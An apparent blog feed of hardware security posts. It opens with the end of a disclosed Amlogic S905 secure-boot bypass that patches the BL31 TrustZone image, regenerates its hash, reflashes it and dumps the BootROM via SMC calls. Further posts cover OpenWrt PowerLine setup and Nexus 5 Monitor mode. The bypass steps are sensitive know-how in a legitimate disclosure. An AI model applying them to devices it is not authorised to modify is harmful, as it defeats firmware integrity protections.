  &lt;span class="n"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hash_sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;// hash whole image except signature&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;sig_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;RSA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;check_rsa_signature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;memcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;sig_offset&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can confirm that the SHA-256 option will only hash the loaded
image and compare the result against the precomputed hash in the
same image. We could have imagined a more complex solution like a
HMAC, but actually in this case only the integrity is checked,
there is no authentication.&lt;br&gt;
&lt;br&gt;
And even if the loaded image is signed with RSA, we can still
switch the signature type to SHA-256 and regenerate the correct
hash.&lt;br&gt;
This issue could have been avoided if the signature type was
enforced by an eFuse.&lt;br&gt;
&lt;br&gt;
This means we can easily modify the BL31 image, the most privileged
code in TrustZone.&lt;br&gt;
&lt;h3&gt;Customizing BL31 image&lt;/h3&gt;
In a previous section, we described the SMC function
&lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt; that can read restricted ranges of
secure memory from Normal World.&lt;br&gt;
Time to practice our NOPing-fu to get rid of these limitations and
thus obtain full access to secure memory.&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/bl31-hdcp22_sec_read_reg-asm-custom.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;
Modified&amp;nbsp;hdcp22_sec_read_reg function&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
We also need to extend the page tables because the BootROM memory
area is not mapped. The MMU initialization is implemented in the
ATF code base, so again this is easy to spot and analyze in the
BL31 binary.&lt;br&gt;
By default, the following memory regions are mapped:&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/plat_gxb_mmap.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Original list of
memory regions mapped in BL31&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
We extend the size of one of them to cover the BootROM region:&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/bl31-plat_gxb_mmap-custom.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Modified list of
memory regions mapped in BL31&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The new size of mapped region 0xD9000000 is 0x80000 so it includes
the BootROM area 0xD9040000-0xD9050000.&lt;br&gt;
We're almost done with BL31 modifications: we still need to update
the SHA-256 hash.&lt;br&gt;
&lt;br&gt;
&lt;h3&gt;aml_bootloader_tool: parse and rehash Amlogic bootloaders&lt;/h3&gt;
This tool can parse and regenerate the SHA-256 of bootloaders
contained in the &lt;i&gt;bootloader&lt;/i&gt; partition. The &lt;a href=
"https://github.com/frederic/aml_bootloader_tool"&gt;source code is on
GitHub&lt;/a&gt;.&lt;br&gt;
Each bootloader is identified by an UUID, they are &lt;a href=
"https://github.com/ARM-software/arm-trusted-firmware/blob/master/include/common/firmware_image_package.h"&gt;
defined in the ATF source code&lt;/a&gt;. In our case, the BL31 image is
entry #2:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aml_bootloader_tool ./dump/bootloader.img H &lt;span class="m"&gt;2&lt;/span&gt;
fip_toc_header.name:        aa640001
fip_toc_header.serial_number:        &lt;span class="m"&gt;12345678&lt;/span&gt;
fip_toc_header.flags:        &lt;span class="m"&gt;0&lt;/span&gt;
TOC ENTRY &lt;span class="c1"&gt;#2&lt;/span&gt;
fip_toc_entry.uuid:        47D4086D4CFE98469B952950CBBD5A00
fip_toc_entry.offset_address:    &lt;span class="m"&gt;14000&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;absolute: 0x20000&lt;span class="o"&gt;)&lt;/span&gt;
fip_toc_entry.size:        0x11130
fip_toc_entry.flags:        0x0
magic&lt;span class="o"&gt;[&lt;/span&gt;@0x0&lt;span class="o"&gt;]&lt;/span&gt;:        @AML
total_len&lt;span class="o"&gt;[&lt;/span&gt;@0x4&lt;span class="o"&gt;]&lt;/span&gt;:    0x11130
header_len&lt;span class="o"&gt;[&lt;/span&gt;@0x8&lt;span class="o"&gt;]&lt;/span&gt;:    0x40
unk_xC&lt;span class="o"&gt;[&lt;/span&gt;@0xC&lt;span class="o"&gt;]&lt;/span&gt;:        0x5eec9094
sig_type&lt;span class="o"&gt;[&lt;/span&gt;@0x10&lt;span class="o"&gt;]&lt;/span&gt;:    0x0
sig_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x14&lt;span class="o"&gt;]&lt;/span&gt;:    0x40
sig_len&lt;span class="o"&gt;[&lt;/span&gt;@0x18&lt;span class="o"&gt;]&lt;/span&gt;:        0x20
data_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x1c&lt;span class="o"&gt;]&lt;/span&gt;:    0x60
unk_x20&lt;span class="o"&gt;[&lt;/span&gt;@0x20&lt;span class="o"&gt;]&lt;/span&gt;:        0x0
cert_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x24&lt;span class="o"&gt;]&lt;/span&gt;:    0x60
cert_len:        0x0
data_len:        0x110d0
unk_x30&lt;span class="o"&gt;[&lt;/span&gt;@0x30&lt;span class="o"&gt;]&lt;/span&gt;:        0x0
code_offset&lt;span class="o"&gt;[&lt;/span&gt;@0x34&lt;span class="o"&gt;]&lt;/span&gt;:    0x60
code_len&lt;span class="o"&gt;[&lt;/span&gt;@0x38&lt;span class="o"&gt;]&lt;/span&gt;:    0x110d0
unk_x3C&lt;span class="o"&gt;[&lt;/span&gt;@0x3C&lt;span class="o"&gt;]&lt;/span&gt;:        0x0
signature:        263BEFAFC5A051C550D31791EC1212576BE65DB8AD365074560F0BABC076D3CA
computed_sha256:    35AD6B284EE2D6B5672DD0958592028D5BF455A6DCD1EB086D8336FB86533853
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The hash of the BL31 image has been updated, we can now reflash the
dump on the device:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./bootloader.img &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/block/bootloader
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, we reboot the device to load our customized BL31 image in
TrustZone.&lt;br&gt;
&lt;h2&gt;Dumping the BootROM&lt;/h2&gt;
The SMC system call can only be invoked from EL1 and above. So we
create a simple kernel module that will perform SMC calls to our
modified function &lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt;&amp;nbsp;in
EL3&lt;i&gt;.&lt;/i&gt;&lt;br&gt;
This quick 'n dirty hack is based on the Amlogic debugfs driver
&lt;i&gt;reg_access&lt;/i&gt;. The &lt;a href=
"https://github.com/frederic/smc_access"&gt;source code is on
GitHub&lt;/a&gt;.&lt;br&gt;
Once loaded, to initiate a SMC call, we write arguments to the
file&amp;nbsp;&lt;i&gt;/sys/kernel/debug/aml_smc/smc&lt;/i&gt;. The first argument
is the ID of the called SMC function (0x82000018 in the case
of&amp;nbsp;&lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt;). The second argument (for this
specific SMC ID) is the read memory address. The result DWORD is
directly printed in kernel logs (we said dirty).&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ insmod ./smc_access.ko
$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;82000018&lt;/span&gt; D9040000 &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;219&lt;/span&gt;.092948@0&lt;span class="o"&gt;]&lt;/span&gt; smc_access: SMC call &lt;span class="m"&gt;82000018&lt;/span&gt; returns: aa1f03e0
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;The result &lt;b&gt;aa1f03e0&lt;/b&gt; is promising, it corresponds to the
ARM instruction:&amp;nbsp;&lt;b&gt;MOV &amp;nbsp;X0, XZR&lt;/b&gt;&lt;br&gt;
To automate the extraction of the entire BootROM memory region, we
create a simple script:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ seq -f %1.f 0xD9040000 0x4 0xD9050000 &lt;span class="p"&gt;|&lt;/span&gt; xargs &lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;echo \&amp;quot;82000018 %x\&amp;quot; &amp;gt; /sys/kernel/debug/aml_smc/smc\n&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d9040000&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d9040004&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d9040008&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d904fff8&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;82000018 d904fffc&amp;quot;&lt;/span&gt; &amp;gt; /sys/kernel/debug/aml_smc/smc
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;And finally, we concate all these DWORDS into a file
&lt;b&gt;bootrom.bin&lt;/b&gt;.&amp;nbsp;&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls -l ./bootrom.bin
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;65537&lt;/span&gt; juil.  &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:43 ./bootrom.bin
$ sha1sum bootrom.bin
bff0c7fb88b4f03e732dc7a4ce504d748d0d47dd  bootrom.bin
$ strings bootrom.bin &lt;span class="p"&gt;|&lt;/span&gt;tail -22
BL1:
FEAT
READ
EMMC
NAND
LOOP
auth failed, reboot...
08dafda0fd31778
glacier.amlogic
qian
&lt;span class="m"&gt;04&lt;/span&gt;/14/15_14:23:08
gcc version &lt;span class="m"&gt;4&lt;/span&gt;.8
08dafda0fd31778
boot@USB
boot@SDC
BAD PASSWORD
!!!!
vRQ&amp;gt;
8STs
LwH&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
Err:sha
&lt;span class="m"&gt;0&lt;/span&gt;!0
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;The S905 SoC provides hardware features to support Secure Boot,
however OEMs can still choose to enable it or not. But even when
Secure Boot is enforced, a flaw in the current version of Amlogic's
BL2 allows to bypass it. So Trusted Execution Environment cannot be
trusted. The good news is BL2 can be patched, unlike BootROM.&lt;br&gt;
&lt;br&gt;
&lt;i&gt;I would like to thank @Karnalzi for the help!&lt;/i&gt;&lt;br&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;
2016-08-08 : Flaw discovered&lt;br&gt;
2016-08-08 : Amlogic &amp;amp; some affected OEMs contacted by email to
find a security PoC&lt;br&gt;
2016-08-10 : OEM #1 replies that "Amlogic doesn't provide any
direct contact."&lt;br&gt;
2016-08-20 : Second attempt to contact Amlogic by email&lt;br&gt;
2016-09-05 : Bug report shared with Amlogic&lt;br&gt;
2016-09-13 : Status update requested&lt;br&gt;
2016-09-25 : Status update requested&lt;br&gt;
2016-10-05 : Public disclosure&lt;/div&gt;&lt;/p&gt;</content><category term="vulnerability"></category><category term="amlogic"></category><category term="arm"></category><category term="security"></category><category term="firmware"></category><category term="trustzone"></category><category term="bootrom"></category><category term="bug"></category></entry><entry><title>PowerLine (PLC) support in OpenWrt for D-Link DHP-1565</title><link href="https://fredericb.info/2016/02/powerline-plc-support-in-openwrt-for-d.html" rel="alternate"></link><published>2016-02-20T13:55:00-08:00</published><updated>2016-02-20T13:55:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2016-02-20:/2016/02/powerline-plc-support-in-openwrt-for-d.html</id><summary type="html">&lt;p&gt;D-Link 1565 is one of the few routers which integrates a PLC (Power
line Communication) chipset (in this case QCA AR7400).
Unfortunately, OpenWrt does not provide support for this feature
yet.&lt;br&gt;
&lt;br&gt;
This post presents configuration steps to enable PLC support in
OpenWrt for this device.
&lt;h2&gt;Hardware configuration&lt;/h2&gt;
By digging into …&lt;/p&gt;</summary><content type="html">&lt;p&gt;D-Link 1565 is one of the few routers which integrates a PLC (Power
line Communication) chipset (in this case QCA AR7400).
Unfortunately, OpenWrt does not provide support for this feature
yet.&lt;br&gt;
&lt;br&gt;
This post presents configuration steps to enable PLC support in
OpenWrt for this device.
&lt;h2&gt;Hardware configuration&lt;/h2&gt;
By digging into &lt;a href="http://tsd.dlink.com.tw/"&gt;D-Link GPL
source code&lt;/a&gt;&amp;nbsp;released for this device, especially function
&lt;b&gt;proprietary_s17_init()&lt;/b&gt; in file
&lt;strong&gt;DHP1565A1_1.01b13_FOSS/src/AthSDK/platform/PLC/drivers/ethernet/phys/athrs17_phy.c&lt;/strong&gt;,
we notice the port 6 of internal switch AR8327 &amp;nbsp;is related to
PLC:&lt;br&gt;
&lt;div class="separator" style="clear: both; text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/dhp-1665-plc/athsdk_port6config.png"&gt;
&lt;/div&gt;
&lt;br&gt;
This port 6 is configured as a RGMII interface to communicate with
PLC chipset. The following patch reproduces the same configuration
in OpenWrt:&lt;br&gt;
&lt;script src=
"https://gist.github.com/frederic/d9d91c2221f04df3a36a.js"&gt;
&lt;/script&gt; To build a custom firmware image, please see &lt;a href=
"https://wiki.openwrt.org/doc/howto/build"&gt;OpenWrt build system
wiki page&lt;/a&gt;.&lt;br&gt;
To flash an OpenWrt image, please see &lt;a href=
"https://wiki.openwrt.org/doc/howto/generic.flashing"&gt;OpenWrt
flashing wiki page&lt;/a&gt;. Don't forget to choose
the&amp;nbsp;&lt;i&gt;factory&lt;/i&gt; image if you're still running the OEM
firmware. If you are already using an OpenWrt firmware, you can use
the &lt;i&gt;sysupgrade&lt;/i&gt; image.
&lt;h2&gt;Network configuration&lt;/h2&gt;
Once our customized OpenWrt image is flashed &amp;amp; booted, we are
already able to see PLC bootloader probes with the swconfig
command:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ swconfig dev switch0 show
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
Port &lt;span class="m"&gt;6&lt;/span&gt;:
 mib: Port &lt;span class="m"&gt;6&lt;/span&gt; MIB counters
RxBroad     : &lt;span class="m"&gt;2282&lt;/span&gt;
Rx64Byte    : &lt;span class="m"&gt;2282&lt;/span&gt;
RxGoodByte  : &lt;span class="m"&gt;146048&lt;/span&gt;
Filtered    : &lt;span class="m"&gt;2152&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
 enable_eee: ???
 pvid: &lt;span class="m"&gt;0&lt;/span&gt;
 link: port:6 link:up speed:1000baseT full-duplex txflow rxflow
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;b&gt;pvid&lt;/b&gt; field indicates that the primary VLAN
identifier&amp;nbsp;of port 6 is 0. In
file&amp;nbsp;&lt;b&gt;/etc/config/network&lt;/b&gt;, we add the port 6 to VLAN
identifier 2, which is dedicated to WAN interface in default
configuration:&lt;br&gt;
&lt;blockquote class="tr_bq"&gt;config switch_vlan&lt;br&gt;
&amp;nbsp;&amp;nbsp;option device 'switch0'&lt;br&gt;
&amp;nbsp;&amp;nbsp;option vlan '2'&lt;br&gt;
&amp;nbsp;&amp;nbsp;option ports '0t 5 &lt;b&gt;6&lt;/b&gt;'&lt;/blockquote&gt;
&lt;i&gt;Warning: configuring PLC port into WAN interface could be a
security issue: any host on WAN side can access to PLC chipset. To
prevent this risk, you might need to set up a different VLAN
configuration.&lt;/i&gt;
&lt;h2&gt;System configuration&lt;/h2&gt;
&lt;h3&gt;open-plc-utils&lt;/h3&gt;
Since the PLC chipset is flashless on this board, PLC firmware
needs to be loaded at each boot. We can use&amp;nbsp;&lt;a href=
"https://github.com/qca/open-plc-utils"&gt;Qualcomm Atheros Open
Powerline Toolkit&lt;/a&gt; to manage &amp;amp; configure this PLC chipset.&lt;br&gt;
&lt;br&gt;
We can cross-compile &lt;a href=
"https://github.com/qca/open-plc-utils"&gt;open-plc-utils&lt;/a&gt; with the
&lt;a href=
"https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/"&gt;OpenWrt
toolchain&lt;/a&gt;.&lt;br&gt;
First, we setup the following environment variables:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PATH&lt;/span&gt;:&amp;lt;OpenWrt-Toolchain-ar71xx&amp;gt;/bin
&lt;span class="nv"&gt;CROSS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mips-openwrt-linux-musl-
&lt;span class="nv"&gt;ROOTFS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;open-plc-utils&amp;gt;/build
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, &lt;b&gt;make&lt;/b&gt; &amp;amp; &lt;b&gt;make install&lt;/b&gt; commands are enough to
build it.&lt;br&gt;
Finally, we copy these freshly built binaries to the device in
&lt;b&gt;/overlay/upper/open-plc-utils/&lt;/b&gt;.&lt;br&gt;
&lt;br&gt;
To do a quick test, we can try the &lt;b&gt;Request Information&lt;/b&gt;
command:&lt;br&gt;
&lt;blockquote class="tr_bq"&gt;# /overlay/upper/open-plc-utils/amptool
-i eth0.2 -Iar&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Request Version Information&lt;br&gt;
eth0.2 00:B0:52:00:00:01 &lt;b&gt;AR7400 BootLoader&lt;/b&gt;&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Fetch Device Attributes&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Device Identity&lt;/blockquote&gt;
&lt;div&gt;The line "AR7400 Bootloader" indicates that PLC chipset is
ready to load a firmware.
&lt;h3&gt;PLC firmware&lt;/h3&gt;
&lt;div&gt;The PLC firmware blob can be found in the &lt;a href=
"http://tsd.dlink.com.tw/"&gt;original firmware image&lt;/a&gt;. Using
&lt;a href="http://binwalk.org/"&gt;Binwalk&lt;/a&gt;, we extract the content
of the &lt;b&gt;/plc&lt;/b&gt; directory from the original rootfs, and copy it
to &lt;b&gt;/overlay/upper/plc/&lt;/b&gt;.&lt;/div&gt;
&lt;div&gt;The NVM file is the firmware blob, and PIB files are
configuration files: &lt;i&gt;ceb&lt;/i&gt; stands for Europe, and &lt;i&gt;na&lt;/i&gt;
for North America.&lt;/div&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;div&gt;The &lt;b&gt;ampboot&lt;/b&gt; tool allows to load the firmware:&lt;/div&gt;
&lt;blockquote class="tr_bq"&gt;# /open-plc-utils/ampboot -i eth0.2 -P
/plc/plc.ceb.pib -N /plc/plc.nvm&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Write /plc/plc.nvm (0)
(00000040:17256)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Start /plc/plc.nvm (0) (000000C0)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Write /plc/plc.ceb.pib (0)
(00200000:16352)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Write /plc/plc.nvm (3)
(00341194:423788)&lt;br&gt;
eth0.2 00:B0:52:00:00:01 Start /plc/plc.nvm (3) (00341A88)&lt;br&gt;
eth0.2 00:11:22:33:44:55
INT7400-MAC-5-2-5203-01-913-20110713-FINAL-B is
running&lt;/blockquote&gt;
&lt;div&gt;By default, the HomeplugAV key is used. You can get more
information with the amptool command used earlier. This can also be
used to discover/join/leave a network, modify the NMK key,
etc...&lt;/div&gt;
&lt;h3&gt;init.d script&lt;/h3&gt;
&lt;div&gt;To load the PLC firmware at each boot, create the following
init script &lt;b&gt;/etc/rc.d/S25amphost&lt;/b&gt;&amp;nbsp;:&lt;/div&gt;
&lt;div&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/sh /etc/rc.common&lt;/span&gt;
&lt;span class="c1"&gt;#start right after network&lt;/span&gt;
&lt;span class="nv"&gt;START&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;
&lt;span class="nv"&gt;USE_PROCD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
start_service&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
 procd_open_instance
 procd_set_param &lt;span class="nb"&gt;command&lt;/span&gt; /open-plc-utils/amphost -i eth0.2 -P /plc/plc.ceb.pib -N /plc/plc.nvm
 procd_set_param respawn
 procd_close_instance
&lt;span class="o"&gt;}&lt;/span&gt;
service_triggers&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
 procd_add_reload_trigger &lt;span class="s2"&gt;&amp;quot;amphost&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;/div&gt;
&lt;div&gt;Then, to enable this script at startup:&lt;/div&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ /etc/init.d/amphost &lt;span class="nb"&gt;enable&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;Et voilà !&lt;/div&gt;

&lt;/div&gt;</content><category term="PLC"></category><category term="dhp-1565"></category><category term="AR7400"></category><category term="openwrt"></category></entry><entry><title>Analysis of Nexus 5 Monitor mode</title><link href="https://fredericb.info/2014/12/analysis-of-nexus-5-monitor-mode.html" rel="alternate"></link><published>2014-12-25T13:28:00-08:00</published><updated>2014-12-25T13:28:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-12-25:/2014/12/analysis-of-nexus-5-monitor-mode.html</id><summary type="html">&lt;p&gt;This article will first describe how to locate the Monitor mode
code in Nexus 5 firmware (&lt;a href=
"https://dl.google.com/dl/android/aosp/hammerhead-ktu84p-factory-35ea0277.tgz"&gt;hammerhead-ktu84p-factory-35ea0277&lt;/a&gt;,
bootloader-hammerhead-hhz11k : c32f8bec310c659c1296739b00c6a8ac).
Then, we will try to understand what it does (its functionalities).
Finally, you will have to find bugs by yourself because I didn't
find any...so far !&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: Terms (Non-)Secure …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;This article will first describe how to locate the Monitor mode
code in Nexus 5 firmware (&lt;a href=
"https://dl.google.com/dl/android/aosp/hammerhead-ktu84p-factory-35ea0277.tgz"&gt;hammerhead-ktu84p-factory-35ea0277&lt;/a&gt;,
bootloader-hammerhead-hhz11k : c32f8bec310c659c1296739b00c6a8ac).
Then, we will try to understand what it does (its functionalities).
Finally, you will have to find bugs by yourself because I didn't
find any...so far !&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: Terms (Non-)Secure world &amp;amp; (Non-)Secure state are used as
synonyms. Term Normal world is also used as synonym of Non-Secure
world.&lt;/em&gt;
&lt;h2&gt;I. Quick introduction to ARM Security Extensions&lt;/h2&gt;
"The Security Extensions define two security states: Secure state
and Non-secure state. All instruction execution takes place either
in Secure state or in Non-secure state.[...] The Security
Extensions also define an additional processor mode, Monitor mode,
that provides a bridge between software running in Non-secure state
and software running in Secure state."&lt;br&gt;
"The Secure Monitor Call exception is implemented only as part of
the Security Extensions. The Secure Monitor Call instruction, SMC ,
requests a Secure Monitor function, causing the processor to enter
Monitor mode."&lt;br&gt;
"When an exception is taken, processor execution is forced to an
address that corresponds to the type of exception. This address is
called the exception vector for that exception. A set of exception
vectors comprises eight consecutive word-aligned memory addresses,
starting at an exception base address. These eight vectors form a
vector table."&lt;br&gt;
-- &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Architecture Reference Manual ARMv7-A&lt;/a&gt;&lt;br&gt;
&lt;h2&gt;II. OpenSource TrustZone examples&lt;/h2&gt;
Trusted Execution Environment (TEE) is the "small" secure kernel
executed in Secure state. The Monitor code &lt;a href=
"http://www.arm.com/products/processors/technologies/trustzone/index.php"&gt;
is part of&lt;/a&gt; the TEE code.&lt;br&gt;
To get an idea of how the Monitor code works, we can take a look at
two TrustZone examples:&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.faqs/ka15417.html"&gt;
Cortex-A9 TrustZone example by ARM&lt;/a&gt; : a simple example of secure
and non-secure code that communicates through Monitor mode.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OP-TEE/optee_os"&gt;OP-TEE by
STMicroelectronics&lt;/a&gt; : an Open Source TEE 1.0
implementation.&lt;/li&gt;
&lt;/ul&gt;
After studying these code samples, we can clearly distinguish two
parts in Monitor code:&lt;br&gt;
&lt;h3&gt;Monitor mode initialization:
called once, at TEE initialization time.&lt;/h3&gt;
In this code, we can notice two specific instructions :&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;Monitor Vector Base Address Register (MVBAR) setup: MVBAR
contains the Monitor vector table address. Both samples use the
same instructions to setup MVBAR :&lt;/li&gt;
&lt;li style="list-style: none"&gt;&amp;nbsp; &amp;nbsp; MCR &amp;nbsp; &amp;nbsp; p15,
0, $RX,c12,c0, 1&lt;br&gt;
where $RX is a pointer to the monitor mode's vector table.&lt;br&gt;
&lt;br&gt;&lt;/li&gt;
